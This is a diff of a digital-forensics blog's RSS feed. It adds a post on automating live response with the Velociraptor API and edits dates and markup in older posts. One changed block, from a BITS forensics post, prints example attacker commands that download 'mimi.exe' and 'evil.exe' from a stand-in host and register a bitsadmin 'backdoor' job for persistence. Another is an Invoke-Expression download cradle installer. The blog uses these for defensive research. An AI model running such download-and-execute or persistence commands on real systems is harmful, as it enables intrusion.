@@ -5,9 +5,155 @@
     <description>A blog for DFIR thoughts, research and for my future reference</description>
     <link>https://mgreen27.github.io/</link>
     <atom:link href="https://mgreen27.github.io/sitemap.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 06 Jul 2019 13:55:32 +1000</pubDate>
-    <lastBuildDate>Sat, 06 Jul 2019 13:55:32 +1000</lastBuildDate>
-    <generator>Jekyll v3.7.4</generator>
+    <pubDate>Sun, 10 Nov 2019 11:51:27 +0000</pubDate>
+    <lastBuildDate>Sun, 10 Nov 2019 11:51:27 +0000</lastBuildDate>
+    <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Live response automation with Velociraptor</title>
+        <description>&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;400&quot; src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/00title.png&quot; /&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;This post is going to talk about the Velociraptor project. Specifically, live response and automation I have built for my own engagements. Im going to provide some background and walk through a proof of concept, then share the code.&lt;/p&gt;
+
+&lt;h3 id=&quot;background&quot;&gt;Background&lt;/h3&gt;
+&lt;p&gt;Velociraptor is an endpoint collection tool developed by Michel Cohen at Velocidex. Mike was the lead developer on many open source tools we know pretty well in our industry: for example Rekall/WinPMem, AFF4 and GRR. Velociraptor was created to simplify the GRR architecture and some of the complexity poblems of clunky back end and bloated data models. The result is a robust query language (VQL) and open source collection framework that is the building blocks of greatness.&lt;/p&gt;
+
+&lt;p&gt;The ability to collect and process data efficiently as part of live response workflow is critial for timely incident response. This is all made possible by Velociraptor, and its open ended API enables interoperability with other tools, speeding up this process.&lt;/p&gt;
+
+&lt;p&gt;Basic setup of Velociraptor is out of scope for this post. I am running Velociraptor on hardened linux platform and plan to walk through setting up a live response processing service. For setup background, I have added a lot of great resources in the references section below.  Although not required, this post assumes some familiarity with Velociraptor and it is reccomended to review some of the references if not familiar with the platform.&lt;/p&gt;
+
+&lt;h3 id=&quot;api-basics&quot;&gt;API Basics&lt;/h3&gt;
+&lt;p&gt;The Velociraptor API is fairly simple architecture and enables VQL queries with an output of familiar VQL result rows. The power to this approach is those rows can then be enriched and processed to enable completx workflows.  It can be invoked both locally or over the network, providing the building blocks we desire in mature incident response.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/01APIServices.png&quot; /&gt;&lt;br /&gt;Velociraptor Services Architecture&lt;/div&gt;
+
+&lt;p&gt;The modularity means post processing work is not part of the Velociraptor front end. We are able to essentially watch an event queue, then execute our API based use cases as desired. Performance can be optimised as with an accessable file system, intensive tasks like Live Response processing can be run on dedicated servers.&lt;/p&gt;
+
+&lt;h3 id=&quot;api-setup&quot;&gt;API Setup&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/Velocidex/velociraptor/tree/master/bindings/python&quot;&gt;Python bindings&lt;/a&gt; are included in the project a long with a &lt;a href=&quot;https://github.com/Velocidex/velociraptor/blob/master/bindings/python/client_example.py&quot;&gt;working client example&lt;/a&gt;. The velocidex team also have a great amount of API connection information on the documentation page. This ensures connection and content development are simple and we can focus on the content.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/02APIinstall.png&quot; /&gt;&lt;br /&gt;Velociraptor Python bindings install commands&lt;/div&gt;
+
+&lt;p&gt;An API configuration file is also required for authentication and key materials are generated similar to other Velociraptor configuration items.&lt;br /&gt;
+        &lt;em&gt;velociraptor –config server.config.yaml config api_client –name [APIName] &amp;gt; api_client.yaml&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;api_client.yaml:&lt;br /&gt;
+        &lt;em&gt;&amp;lt;SNIP Certificate information&amp;gt;&lt;/em&gt;&lt;br /&gt;
+        &lt;em&gt;api_connection_string: 127.0.0.1:8001&lt;/em&gt;&lt;br /&gt;
+        &lt;em&gt;name: [APIName]&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Note: default server.config.yaml configures the API service to bind to all interfaces and listen on port 8001. Please ensure relevant bindings and ports availible.&lt;/p&gt;
+
+&lt;p&gt;The example client script contains a great example of setting up API connection and a query stub. I have chosen to modify the script and add some global variables to simplify execution.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;450&quot; src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/03APIQuery.png&quot; /&gt;&lt;br /&gt;Example API python global variables&lt;/div&gt;
+
+&lt;p&gt;CONFIG is my generated client API configuration path. I have chosen the default velociraptor config path but this can be any location.&lt;/p&gt;
+
+&lt;p&gt;CASES is my output folder path. This can be an ingestion path or distributed storage to plug processed data into additional workflow.&lt;/p&gt;
+
+&lt;p&gt;QUERY is my VQL I plan to query through the API. The query monitors the Velociraptor server for completed flow events; i.e &lt;em&gt;watch_monitoring(artifact=’System.Flow.Completion’)&lt;/em&gt;. A WHERE clause extracts Flows containing artefacts with results and names containing  “KapeFiles” or “LiveResponse”.&lt;/p&gt;
+
+&lt;p&gt;What makes VQL so powerful is we can enrich with additional VQL or formatting. In my example, the SELECT statement extracts relevant fields pertaining to a completed flow for my processing use cases. This includes a list of uploaded files, their path and other flow metadata.&lt;/p&gt;
+
+&lt;h3 id=&quot;api-processing&quot;&gt;API Processing&lt;/h3&gt;
+&lt;p&gt;Now we have collected data points requried for processing, its as simple as running our normal processing logic applied to each row of results.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;400&quot; src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/04Process.png&quot; /&gt;&lt;br /&gt;Extraction and printing of Flow results&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;300&quot; src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/04ProcessStdOut.png&quot; /&gt;&lt;br /&gt;StdOut: Flow results&lt;/div&gt;
+
+&lt;p&gt;After setting up relevant variables for processing, we can then shuttle off to tasks. Below is my plaso based timeliner function for a quick and dirty timeline.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;400&quot; src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/05TimelinerFlow.png&quot; /&gt;&lt;br /&gt;Calling timeliner&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;500&quot; src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/05Timeliner.png&quot; /&gt;&lt;br /&gt;Timeliner: plaso based timeline function&lt;/div&gt;
+
+&lt;p&gt;The function sets up relevant paths for the command, creates target folder and shells out to the relevant plaso script. Modification is simple and the results can be collected manually or by data platform agent of choice.&lt;/p&gt;
+
+&lt;p&gt;Similarly, file specific processing based on upload_paths enables traversing the flow upload paths once for optimal performance. I have also included a test and will only process some paths if the artifact of interest was collected.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;450&quot; src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/05ProcessingPathBased.png&quot; /&gt;&lt;br /&gt;Example path specific processing flow&lt;/div&gt;
+
+&lt;h3 id=&quot;so-what-do-we-collect&quot;&gt;So what do we collect?&lt;/h3&gt;
+&lt;p&gt;The Velociraptor project has built in artefacts that are able to be customised easily. In the early days of Velociraptor I had written custom ntfs collection artifacts to accommodate my collection use cases. The velocidex team have recently developed an artefact that makes this process much easier. The artefact is called Windows.KapeFiles.Targets and extracts the collection profiles from Eric Zimmerman’s KapeFiles project.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/06KapeTargets.png&quot; /&gt;&lt;br /&gt;Artifact: KapeTargets&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;From a user perspective this is very easy with preset levels of live response enabled or individual targetted artefact collection. Of course I still have my own live response preferences based on use case, but Kape files is a fairly mature and modular collection capability.&lt;/p&gt;
+
+&lt;h3 id=&quot;how-do-i-run-it&quot;&gt;How do I run it?&lt;/h3&gt;
+&lt;p&gt;To run simply call the client script inside the same folder as the bindings.&lt;br /&gt;
+For example  &lt;br /&gt;
+        &lt;em&gt;/usr/bin/python3 $VRAPTOR/api/processing.py.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;In my usecase I prefer an on demand Velociraptor processing service with the following attributes:&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center; font-size:70%;&quot;&gt;&lt;img width=&quot;450&quot; src=&quot;/static/img/article_images/2019-11-10-LRwithVRaptor/07Service.png&quot; /&gt;&lt;br /&gt;Velociraptor Processing Service&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Set to on demand, I simply execute service startup with:&lt;br /&gt;
+        &lt;em&gt;sudo systemctl start vraptor-processing&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Stop with:&lt;br /&gt;
+        &lt;em&gt;sudo systemctl stop vraptor-processing&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;And view status with:&lt;br /&gt;
+        &lt;em&gt;sudo systemctl status vraptor-processing -l&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Once running, the service will wait for relevant rows to be returned and process as configured.&lt;/p&gt;
+
+&lt;h3 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h3&gt;
+&lt;p&gt;In this post I have walked through using the Velociraptor API for live response processing. Velociraptor is modular providing access to underlying services and enabling blue teams to build the workflow that they need, on the infastructure that works for them. In my instance the example covers a small subset of what I plan to deply but is already saving on some really time consuming tasks.&lt;/p&gt;
+
+&lt;p&gt;For those that are interested I have included below:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;static/other/Velociraptor/VRaptorAPISetup.sh&quot;&gt;An install script for the API bindings and service install&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;static/other/Velociraptor/processing.py&quot;&gt;A POC processsing script&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;I hope you have gained some knowledge on Velociraptor API setup and one of the most important use cases for incident response. Please feel free to reach out and provide feedback or improvements.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;further-resources&quot;&gt;Further resources&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.velocidex.com/about/&quot;&gt;Velociraptor Documentation&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.velocidex.com/docs/presentations/sans_dfir_summit2019/&quot;&gt;Velociraptor Overview at 2019 SANs DFIR Summit&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.velocidex.com/docs/getting-started/&quot;&gt;Velociraptor Getting started&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.velocidex.com/docs/user-interface/api/&quot;&gt;Velociraptor API documentation&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://github.com/Velocidex/velociraptor/tree/master/bindings/python&quot;&gt;Velociraptor Python Bindings&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 10 Nov 2019 00:00:00 +0000</pubDate>
+        <link>https://mgreen27.github.io/posts/2019/11/10/LRwithVRaptor.html</link>
+        <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/11/10/LRwithVRaptor.html</guid>
+        
+        <category>DFIR</category>
+        
+        <category>Velociraptor</category>
+        
+        <category>VQL</category>
+        
+        
+        <category>posts</category>
+        
+      </item>
     
       <item>
         <title>O365: Hidden InboxRules</title>
@@ -142,7 +288,7 @@
 &lt;/ol&gt;
 
 </description>
-        <pubDate>Sun, 09 Jun 2019 00:00:00 +1000</pubDate>
+        <pubDate>Sun, 09 Jun 2019 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io/posts/2019/06/09/O365HiddenRules.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/06/09/O365HiddenRules.html</guid>
         
@@ -215,7 +361,7 @@ Then execution via a bat file or commandline as below:&lt;/li&gt;
 6) YARA v3.10.0. &lt;a href=&quot;https://yara.readthedocs.io/en/v3.10.0/modules/pe.html&quot;&gt;PE Module&lt;/a&gt;
 &lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 </description>
-        <pubDate>Wed, 29 May 2019 00:00:00 +1000</pubDate>
+        <pubDate>Wed, 29 May 2019 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html</guid>
         
@@ -277,7 +423,7 @@ Similarly, output to a logfile for data ingestion. It is worthy to note: the POC
 &lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;limitations&quot;&gt;Limitations&lt;/h1&gt;
-&lt;p&gt;One of the limitations of leveraging WMI Eventing as an event source is events typically do not hold all the appropriate data for a mature detection use case. To enrich the detection, we require to query the Win32_Process class. There is a slight delay in obtaining process metadata so very short-lived processes (fraction of a second) may cause missed results. In my testing, these very short-lived commands like renamed cmd: &lt;code class=&quot;highlighter-rouge&quot;&gt;cdm /c echo &amp;lt;string&amp;gt;&lt;/code&gt; failed to generate wmi data however a slight pause during a local ping recorded the event. For the use case of a download cradle, access shell or other interactive commands typically of interest I do not foresee an issue but please keep this limitation in mind.&lt;/p&gt;
+&lt;p&gt;One of the limitations of leveraging WMI Eventing as an event source is events typically do not hold all the appropriate data for a mature detection use case. To enrich the detection, we require to query the Win32_Process class. There is a slight delay in obtaining process metadata so very short-lived processes (fraction of a second) may cause missed results. In my testing, these very short-lived commands like renamed cmd: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cdm /c echo &amp;lt;string&amp;gt;&lt;/code&gt; failed to generate wmi data however a slight pause during a local ping recorded the event. For the use case of a download cradle, access shell or other interactive commands typically of interest I do not foresee an issue but please keep this limitation in mind.&lt;/p&gt;
 
 &lt;p&gt;A second limitation is performance. Although not particularly resource intensive in my testing (no visible resource utilisation), in production there may be unexpected constraints. I have filtered my Process Events with this in mind but testing is recommended. I have also specifically kept the binary attribute matching use case very simple with a eye on performance. This may mean less fidelity in alerting, however the POC is fairly simple to modify and add capabilities.&lt;/p&gt;
 
@@ -303,7 +449,7 @@ Similarly, output to a logfile for data ingestion. It is worthy to note: the POC
 &lt;/ol&gt;
 
 </description>
-        <pubDate>Sun, 12 May 2019 00:00:00 +1000</pubDate>
+        <pubDate>Sun, 12 May 2019 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html</guid>
         
@@ -396,10 +542,10 @@ WriteScriptBlock writes a .ps1 file containing the Invoke-LiveResponse scriptblo
 &lt;p&gt;For installation please &lt;a href=&quot;https://github.com/mgreen27/Invoke-LiveResponse/archive/master.zip&quot;&gt;download Invoke-LiveResponse&lt;/a&gt; and add to your Powershell profile. Detailed instructions can be found on the &lt;a href=&quot;https://github.com/mgreen27/Invoke-LiveResponse/wiki/Installation&quot;&gt;wiki&lt;/a&gt;.&lt;/p&gt;
 
 &lt;p&gt;To import the module:&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;PS&amp;gt; Import-Module Invoke-LiveResponse&lt;/code&gt;&lt;/p&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PS&amp;gt; Import-Module Invoke-LiveResponse&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;To view help:&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;PS&amp;gt; Get-Help Invoke-LiveResponse -detailed&lt;/code&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PS&amp;gt; Get-Help Invoke-LiveResponse -detailed&lt;/code&gt;
  &lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;memory-and-custom-disk&quot;&gt;Memory and custom disk&lt;/h4&gt;
@@ -414,7 +560,7 @@ Firstly, I am interested in pagefile and swapfile collection targeting the root 
 &lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;750&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/06setup.png&quot; /&gt;&lt;br /&gt;Custom Scrtipblock: add to custom folder and run Invoke-LiveResponse.&lt;/div&gt;
 
 &lt;p&gt;Next, add the custom scriptblock into the Invoke-LiveResponse module folder, load and then execute Invoke-LiveResponse. The Command line is:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;PS&amp;gt; Invoke-LiveResponse -mem -custom -vss -WriteScriptblock -LocalOut:$True&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PS&amp;gt; Invoke-LiveResponse -mem -custom -vss -WriteScriptblock -LocalOut:$True&lt;/code&gt;&lt;br /&gt;
 This command will output the generated live response script, to which we need to add a copy of WinPMem to the root of the target location. In my case, this was a removable SSD drive mounted as E:.&lt;/p&gt;
 
 &lt;div style=&quot;text-align: center; font-size:70%&quot;&gt;&lt;img width=&quot;600&quot; src=&quot;/static/img/article_images/2019-04-07-ILRScriptBuilder/06execution.png&quot; /&gt;&lt;br /&gt;Invoke-LiveResponse: Local Execution from USB.&lt;/div&gt;
@@ -429,7 +575,7 @@ This command will output the generated live response script, to which we need to
 &lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Sun, 07 Apr 2019 00:00:00 +1100</pubDate>
+        <pubDate>Sun, 07 Apr 2019 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io/posts/2019/04/07/ILRScriptBuilder.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/04/07/ILRScriptBuilder.html</guid>
         
@@ -567,7 +713,7 @@ Microsoft BITS also has some specific forensic artefacts I have previously cover
 &lt;p&gt;8) Green, Matthew. &lt;a href=&quot;https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html&quot;&gt;Sharing my BITS&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Mon, 02 Apr 2018 00:00:00 +1000</pubDate>
+        <pubDate>Mon, 02 Apr 2018 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html</guid>
         
@@ -599,14 +745,14 @@ Microsoft BITS also has some specific forensic artefacts I have previously cover
 &lt;h3 id=&quot;artefact-creation&quot;&gt;Artefact creation&lt;/h3&gt;
 &lt;p&gt;Most of my testing has been working with BITS 5.5 in Windows 8.1, however the content below was tested on Windows 7 through 10.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Bits download initiated via Powershell&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Start-BitsTransfer&lt;/span&gt; -Source &lt;span class=&quot;s2&quot;&gt;&quot;http://www.totallylegitinappnews.com/mimi.jpg&quot;&lt;/span&gt; -Destination &lt;span class=&quot;s2&quot;&gt;&quot;c:\Windows\vss\mimi.exe&quot;&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Bits download initiated via Powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Start-BitsTransfer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Source&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.totallylegitinappnews.com/mimi.jpg&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Destination&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c:\Windows\vss\mimi.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 
-&lt;span class=&quot;c1&quot;&gt;# Peristence via bitsadmin.exe&lt;/span&gt;
-CMD&amp;gt; bitsadmin /create backdoor
-CMD&amp;gt; bitsadmin /addfile backdoor &lt;span class=&quot;s2&quot;&gt;&quot;http://www.totallylegitinappnews.com/evil.exe&quot;&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;c:\windows\VSS\evil.exe&quot;&lt;/span&gt;
-CMD&amp;gt; bitsadmin /SetNotifyCmdLine backdoor c:\Windows\VSS\evil.exe NULL
-CMD&amp;gt; bitsadmin /resume backdoor&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Peristence via bitsadmin.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bitsadmin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/create&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bitsadmin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/addfile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.totallylegitinappnews.com/evil.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c:\windows\VSS\evil.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bitsadmin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/SetNotifyCmdLine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c:\Windows\VSS\evil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bitsadmin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/resume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;backdoor&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;I have shown some really simple examples above to generate artefacts, however in the wild there are also several attack tools that make building stealthy download cradles trivial. Please see references for more information.&lt;/p&gt;
 
@@ -723,7 +869,7 @@ Process command line visibility on the endpoints to spot evil process chains and
 &lt;/ol&gt;
 
 </description>
-        <pubDate>Sun, 18 Feb 2018 00:00:00 +1100</pubDate>
+        <pubDate>Sun, 18 Feb 2018 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html</guid>
         
@@ -787,19 +933,19 @@ implementation for live response and file collections over Powershell remoting. 
 &lt;h3 id=&quot;setup&quot;&gt;Setup&lt;/h3&gt;
 &lt;p&gt;On a Powershell 4+ collector machine, assuming you trust me, run the following proxy aware powershell commands to download then install. The install places Invoke-LiveResponse into the running users profile.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Proxy aware download install of Invoke-LiveResponse&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;Set-Executionpolicy&lt;/span&gt; -ExecutionPolicy bypass -force
-&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/mgreen27/Powershell-IR/master/Get-Forensicating.ps1&quot;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;.Proxy&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;System.Net.WebRequest]::GetSystemWebProxy&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;.Proxy.Credentials&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;System.Net.CredentialCache]::DefaultNetworkCredentials
-&lt;span class=&quot;nb&quot;&gt;Invoke-Expression&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;.DownloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Proxy aware download install of Invoke-LiveResponse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Set-Executionpolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExecutionPolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/mgreen27/Powershell-IR/master/Get-Forensicating.ps1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
